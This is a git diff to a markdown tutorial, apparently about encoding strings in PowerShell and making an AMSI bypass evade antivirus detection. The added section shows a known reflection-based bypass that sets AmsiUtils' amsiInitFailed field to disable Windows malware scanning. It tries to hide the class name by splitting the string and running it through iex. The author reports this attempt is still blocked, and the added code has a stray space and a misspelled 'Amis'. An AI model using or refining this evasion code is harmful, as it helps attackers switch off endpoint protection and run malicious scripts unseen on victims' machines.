@@ -134,7 +134,7 @@ $decodedString = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBa
 # Output: "Hello World"
 ```
 
->Note that the FromBase64String and GetBytes methods of the System.Convert and System.Text.Encoding classes, respectively, can be used to decode the encoded strings. You can also use the ToBase64String, ToBase32String, and ToString methods to encode strings in these different bases.
+> Note that the FromBase64String and GetBytes methods of the System.Convert and System.Text.Encoding classes, respectively, can be used to decode the encoded strings. You can also use the ToBase64String, ToBase32String, and ToString methods to encode strings in these different bases.
 
 ## Amsi bypass fudding!
 
@@ -151,5 +151,15 @@ Original Amsi bypass (Detected)
 Now lets try to split a string up or two!
 
 Lets start with the `"System.Management.Automation.AmsiUtils"` specifically the `AmsiUtils` part
+
+```
+$code="Write-OutPut `"System.Management.Automation .`" +`"Amis`"+`"Utils`" "
+```
+
+iex
+```
+[Ref].Assembly.GetType((iex $code)).GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+```
+> Still blocked!
 
 
